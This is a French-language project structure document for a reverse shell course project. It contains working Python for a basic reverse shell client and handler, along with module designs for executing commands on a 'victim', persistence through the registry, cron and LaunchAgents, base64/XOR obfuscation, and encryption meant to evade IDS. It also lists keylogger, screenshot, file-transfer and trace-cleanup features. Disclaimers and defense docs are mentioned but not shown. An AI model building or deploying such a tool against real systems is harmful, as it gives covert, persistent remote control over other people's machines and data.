# 🏗️ Structure du Projet : Reverse Shell

## 📋 Vue d'Ensemble

Ce projet implémente un **reverse shell** professionnel avec architecture modulaire, permettant un contrôle à distance sécurisé (à des fins éducatives uniquement).

### Objectifs Pédagogiques

- Comprendre l'architecture client-serveur
- Maîtriser les sockets réseau TCP/IP
- Implémenter du chiffrement de communication
- Gérer la persistance système
- Pratiquer l'obfuscation de code

⚠️ **AVERTISSEMENT LÉGAL** : Ce projet est **strictement éducatif**. L'utilisation malveillante est illégale et passible de poursuites.

---

## 📁 Arborescence Complète

```
18_reverse_shell/
│
├── PROJECT_STRUCTURE.md          ← Ce fichier (architecture détaillée)
├── README.md                      ← Guide d'utilisation du projet
├── Cours.md                       ← Théorie approfondie sur les reverse shells
├── exercice.md                    ← Étapes guidées du projet
│
├── config/                        ← Configuration centralisée
│   ├── __init__.py
│   └── settings.py                ← Paramètres (IP, port, clés crypto)
│
├── src/                           ← Code source principal
│   ├── __init__.py
│   │
│   ├── client/                    ← Code de la victime (payload)
│   │   ├── __init__.py
│   │   ├── connection.py          ← Gestion connexion vers serveur
│   │   ├── commands.py            ← Exécution des commandes reçues
│   │   ├── persistence.py         ← Mécanismes de persistance
│   │   └── stealth.py             ← Anti-détection (optionnel)
│   │
│   ├── server/                    ← Code de l'attaquant (handler)
│   │   ├── __init__.py
│   │   ├── listener.py            ← Écoute des connexions
│   │   ├── handler.py             ← Gestion des sessions
│   │   ├── commands.py            ← Interface de commandes
│   │   └── logger.py              ← Enregistrement des activités
│   │
│   └── utils/                     ← Utilitaires communs
│       ├── __init__.py
│       ├── crypto.py              ← Chiffrement/déchiffrement
│       ├── encoding.py            ← Encodage de données
│       ├── network.py             ← Helpers réseau
│       └── obfuscation.py         ← Obfuscation de code
│
├── examples/                      ← Exemples progressifs
│   ├── 01_basic_shell.py          ← Shell basique (débutant)
│   ├── 02_encrypted_shell.py      ← Avec chiffrement (intermédiaire)
│   ├── 03_persistent_shell.py     ← Avec persistance (avancé)
│   └── 04_stealth_shell.py        ← Avec anti-détection (expert)
│
├── tests/                         ← Tests unitaires
│   ├── __init__.py
│   ├── test_connection.py
│   ├── test_crypto.py
│   └── test_commands.py
│
├── docs/                          ← Documentation supplémentaire
│   ├── architecture.md            ← Diagrammes d'architecture
│   ├── protocole.md               ← Protocole de communication
│   ├── detection.md               ← Comment détecter ce type d'attaque
│   └── defense.md                 ← Contre-mesures
│
├── scripts/                       ← Scripts utilitaires
│   ├── generate_payload.py       ← Génère des payloads personnalisés
│   ├── test_connection.py        ← Teste la connectivité
│   └── cleanup.py                 ← Nettoie les traces
│
└── requirements.txt               ← Dépendances Python
```

---

## 🎯 Explication des Modules

### 1. **config/settings.py**

Configuration centralisée du projet.

```python
# Paramètres réseau
SERVER_HOST = "0.0.0.0"
SERVER_PORT = 4444

# Paramètres de sécurité
ENCRYPTION_KEY = b"votre_cle_secrete_32_caracteres!"
USE_ENCRYPTION = True

# Paramètres de persistance
PERSISTENCE_ENABLED = False
PERSISTENCE_METHOD = "registry"  # ou "cron", "service"

# Paramètres de connexion
RECONNECT_DELAY = 5  # secondes
MAX_RECONNECT_ATTEMPTS = -1  # -1 = infini

# Logging
LOG_LEVEL = "INFO"
LOG_FILE = "shell.log"
```

**Pourquoi ?** Centraliser la configuration facilite la maintenance et permet de générer différentes versions du payload.

---

### 2. **src/client/** (Payload)

#### `connection.py` - Gestion de la Connexion

```python
class ReverseShellClient:
    """Client qui se connecte au serveur de l'attaquant"""
    
    def __init__(self, host, port):
        self.host = host
        self.port = port
        self.socket = None
        self.crypto = CryptoManager()
    
    def connect(self):
        """Établit la connexion avec le serveur"""
        # Création du socket
        # Gestion des erreurs
        # Chiffrement de la connexion
        pass
    
    def send_data(self, data):
        """Envoie des données chiffrées"""
        encrypted = self.crypto.encrypt(data)
        self.socket.send(encrypted)
    
    def receive_data(self):
        """Reçoit et déchiffre les données"""
        encrypted = self.socket.recv(4096)
        return self.crypto.decrypt(encrypted)
```

**Concepts Clés :**
- Sockets TCP/IP
- Gestion des reconnexions
- Chiffrement des communications

#### `commands.py` - Exécution des Commandes

```python
class CommandExecutor:
    """Exécute les commandes reçues du serveur"""
    
    def execute(self, command):
        """Exécute une commande shell et retourne la sortie"""
        try:
            output = subprocess.check_output(
                command, 
                shell=True, 
                stderr=subprocess.STDOUT
            )
            return output.decode()
        except Exception as e:
            return f"Erreur: {str(e)}"
    
    def execute_python(self, code):
        """Exécute du code Python directement"""
        try:
            exec(code)
        except Exception as e:
            return f"Erreur Python: {str(e)}"
```

**Concepts Clés :**
- Module `subprocess`
- Exécution de commandes système
- Gestion des erreurs

#### `persistence.py` - Mécanismes de Persistance

```python
class PersistenceManager:
    """Assure la persistance du shell après redémarrage"""
    
    def install_windows(self):
        """Installation via registre Windows"""
        # HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\Run
        pass
    
    def install_linux(self):
        """Installation via cron ou systemd"""
        # Crontab: @reboot /path/to/script
        pass
    
    def install_mac(self):
        """Installation via LaunchAgents"""
        # ~/Library/LaunchAgents/
        pass
```

**Concepts Clés :**
- Détection de l'OS
- Registre Windows
- Crontab Linux
- LaunchAgents macOS

---

### 3. **src/server/** (Handler)

#### `listener.py` - Serveur d'Écoute

```python
class ReverseShellServer:
    """Serveur qui écoute les connexions des victimes"""
    
    def __init__(self, host, port):
        self.host = host
        self.port = port
        self.socket = None
        self.sessions = []  # Liste des victimes connectées
    
    def start(self):
        """Démarre le serveur"""
        self.socket = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        self.socket.bind((self.host, self.port))
        self.socket.listen(5)
        print(f"[+] Serveur démarré sur {self.host}:{self.port}")
    
    def accept_connection(self):
        """Accepte une nouvelle connexion"""
        client_socket, address = self.socket.accept()
        session = SessionHandler(client_socket, address)
        self.sessions.append(session)
        print(f"[+] Nouvelle victime : {address}")
        return session
```

**Concepts Clés :**
- Serveur TCP multi-clients
- Gestion de sessions multiples
- Threading pour gérer plusieurs victimes

#### `handler.py` - Gestion des Sessions

```python
class SessionHandler:
    """Gère une session avec une victime"""
    
    def __init__(self, socket, address):
        self.socket = socket
        self.address = address
        self.info = self.get_victim_info()
    
    def get_victim_info(self):
        """Récupère infos sur la victime"""
        return {
            "os": "Windows 10",
            "hostname": "VICTIM-PC",
            "user": "John",
            "ip": self.address[0]
        }
    
    def send_command(self, command):
        """Envoie une commande à la victime"""
        self.socket.send(command.encode())
    
    def receive_output(self):
        """Reçoit la sortie de la commande"""
        return self.socket.recv(4096).decode()
```

#### `commands.py` - Interface de Commandes

```python
class CommandInterface:
    """Interface de commande pour l'attaquant"""
    
    def __init__(self, session):
        self.session = session
        self.history = []
    
    def run(self):
        """Boucle principale de commandes"""
        while True:
            cmd = input(f"{self.session.address}> ")
            
            if cmd == "exit":
                break
            elif cmd == "info":
                self.show_victim_info()
            elif cmd.startswith("download"):
                self.download_file(cmd.split()[1])
            elif cmd.startswith("upload"):
                self.upload_file(cmd.split()[1])
            else:
                self.execute_command(cmd)
    
    def execute_command(self, cmd):
        """Exécute une commande sur la victime"""
        self.session.send_command(cmd)
        output = self.session.receive_output()
        print(output)
        self.history.append((cmd, output))
```

**Commandes Disponibles :**
- `info` - Informations sur la victime
- `download <file>` - Télécharger un fichier
- `upload <file>` - Uploader un fichier
- `screenshot` - Capture d'écran
- `keylog start/stop` - Keylogger
- `persist` - Installer la persistance
- `exit` - Fermer la session

---

### 4. **src/utils/** (Utilitaires)

#### `crypto.py` - Chiffrement

```python
from cryptography.fernet import Fernet

class CryptoManager:
    """Gestion du chiffrement des communications"""
    
    def __init__(self, key=None):
        if key is None:
            key = Fernet.generate_key()
        self.cipher = Fernet(key)
    
    def encrypt(self, data):
        """Chiffre des données"""
        if isinstance(data, str):
            data = data.encode()
        return self.cipher.encrypt(data)
    
    def decrypt(self, encrypted_data):
        """Déchiffre des données"""
        decrypted = self.cipher.decrypt(encrypted_data)
        return decrypted.decode()
```

**Pourquoi Chiffrer ?**
- Éviter la détection par IDS/IPS
- Protéger les communications
- Rendre l'analyse réseau plus difficile

#### `obfuscation.py` - Obfuscation

```python
import base64

class Obfuscator:
    """Obfuscation du code et des données"""
    
    @staticmethod
    def encode_string(s):
        """Encode une string en base64"""
        return base64.b64encode(s.encode()).decode()
    
    @staticmethod
    def decode_string(s):
        """Décode une string base64"""
        return base64.b64decode(s).decode()
    
    @staticmethod
    def xor_string(data, key):
        """Chiffrement XOR simple"""
        return bytes([b ^ key for b in data])
```

---

## 🚀 Workflow de Développement

### Étape 1 : Shell Basique (Débutant)

**Fichier :** `examples/01_basic_shell.py`

```python
# Client basique (30 lignes)
import socket
import subprocess

def client():
    s = socket.socket()
    s.connect(('127.0.0.1', 4444))
    
    while True:
        command = s.recv(1024).decode()
        if command.lower() == 'exit':
            break
        output = subprocess.getoutput(command)
        s.send(output.encode())
    
    s.close()

# Serveur basique (20 lignes)
def server():
    s = socket.socket()
    s.bind(('0.0.0.0', 4444))
    s.listen(1)
    print("[+] En attente de connexion...")
    
    conn, addr = s.accept()
    print(f"[+] Connexion de {addr}")
    
    while True:
        cmd = input("shell> ")
        conn.send(cmd.encode())
        if cmd.lower() == 'exit':
            break
        output = conn.recv(4096).decode()
        print(output)
    
    conn.close()
```

**Concepts Appris :**
- ✅ Sockets TCP/IP
- ✅ Communication bidirectionnelle
- ✅ Exécution de commandes

---

### Étape 2 : Ajout du Chiffrement (Intermédiaire)

**Fichier :** `examples/02_encrypted_shell.py`

Ajoute le module `src/utils/crypto.py` pour chiffrer toutes les communications.

**Nouveaux Concepts :**
- ✅ Cryptographie symétrique (Fernet)
- ✅ Gestion de clés
- ✅ Chiffrement de flux

---

### Étape 3 : Architecture Modulaire (Avancé)

**Fichier :** Utilise toute la structure `src/`

Refactoriser le code en modules réutilisables.

**Nouveaux Concepts :**
- ✅ Architecture MVC
- ✅ Séparation des responsabilités
- ✅ Tests unitaires

---

### Étape 4 : Persistance et Stealth (Expert)

**Fichiers :** 
- `src/client/persistence.py`
- `src/client/stealth.py`

Ajoute la persistance et l'anti-détection.

**Nouveaux Concepts :**
- ✅ Registre Windows / Cron Linux
- ✅ Obfuscation de code
- ✅ Évasion d'antivirus (théorique)

---

## 📚 Ressources et Documentation

### Cours Théoriques

1. **Cours.md** (800+ lignes) :
   - Histoire des reverse shells
   - Protocoles réseau (TCP/IP)
   - Cryptographie de base
   - Détection et défense

### Documentation Technique

- **docs/architecture.md** : Diagrammes détaillés
- **docs/protocole.md** : Spécification du protocole
- **docs/detection.md** : Comment détecter ces attaques
- **docs/defense.md** : Contre-mesures efficaces

### Exercices Pratiques

**exercice.md** contient :
- 10 défis progressifs
- Tests de validation
- Challenges avancés

---

## ⚙️ Installation et Utilisation

### Prérequis

```bash
# Python 3.8+
python --version

# Installer les dépendances
pip install -r requirements.txt
```

### Configuration

Éditer `config/settings.py` :
```python
SERVER_HOST = "0.0.0.0"  # Votre IP
SERVER_PORT = 4444        # Port d'écoute
ENCRYPTION_KEY = b"..."   # Clé de 32 bytes
```

### Lancer le Serveur (Attaquant)

```bash
python -m src.server.listener
```

### Lancer le Client (Victime)

```bash
python -m src.client.connection
```

### Tester Localement

```bash
# Terminal 1 : Serveur
python examples/01_basic_shell.py --server

# Terminal 2 : Client
python examples/01_basic_shell.py --client
```

---

## 🛡️ Sécurité et Éthique

### ⚠️ AVERTISSEMENTS IMPORTANTS

1. **Usage Légal Uniquement**
   - Ce projet est ÉDUCATIF
   - Ne l'utilisez QUE sur vos propres systèmes
   - Obtenez une autorisation écrite avant tout test

2. **Responsabilité**
   - L'auteur n'est PAS responsable des usages malveillants
   - Vous êtes responsable de vos actions

3. **Environnement de Test**
   - Utilisez des machines virtuelles isolées
   - Ne testez JAMAIS sur des réseaux de production
   - Utilisez un réseau local déconnecté d'Internet

### 🎓 Objectifs Pédagogiques

Ce projet vous apprend à :
- ✅ Comprendre les vecteurs d'attaque réseau
- ✅ Identifier les vulnérabilités
- ✅ Développer des contre-mesures efficaces
- ✅ Améliorer la sécurité de vos systèmes

---

## 🧪 Tests et Validation

### Tests Unitaires

```bash
# Lancer tous les tests
python -m pytest tests/

# Test spécifique
python -m pytest tests/test_connection.py
```

### Validation Manuelle

**Checklist :**
- [ ] Connexion établie avec succès
- [ ] Commandes exécutées correctement
- [ ] Chiffrement fonctionnel
- [ ] Gestion des erreurs
- [ ] Reconnexion automatique
- [ ] Persistance installée (optionnel)

---

## 📖 Progression Recommandée

### Semaine 1 : Fondamentaux
- Lire Cours.md (sections 1-4)
- Comprendre les sockets TCP/IP
- Implémenter `examples/01_basic_shell.py`

### Semaine 2 : Chiffrement
- Lire Cours.md (section 5)
- Apprendre la cryptographie Fernet
- Implémenter `examples/02_encrypted_shell.py`

### Semaine 3 : Architecture
- Refactoriser en modules
- Créer tests unitaires
- Implémenter `src/client/` et `src/server/`

### Semaine 4 : Avancé
- Persistance système
- Obfuscation de code
- Anti-détection (théorique)

---

## 🔗 Ressources Externes

### Livres Recommandés
- *Black Hat Python* - Justin Seitz
- *Violent Python* - TJ O'Connor
- *Python for Cybersecurity* - Howard Poston

### Cours en Ligne
- TryHackMe - Network Exploitation
- HackTheBox - Penetration Testing
- PentesterLab - Web & Network

### Documentation
- Python Socket Documentation
- Cryptography Library Docs
- OWASP Testing Guide

---

## 🎯 Conclusion

Cette structure modulaire vous permet de :
1. **Apprendre progressivement** : Du simple au complexe
2. **Comprendre l'architecture** : Code bien organisé
3. **Tester facilement** : Modules indépendants
4. **Étendre le projet** : Ajout facile de fonctionnalités

**Prochaine Étape :** Lisez `Cours.md` pour la théorie complète, puis commencez par `examples/01_basic_shell.py`.

---

**Auteur :** Tudy Gbaguidi  
**Date :** 2025  
**Version :** 1.0  
**Licence :** Éducatif uniquement - Pas d'usage commercial ou malveillant

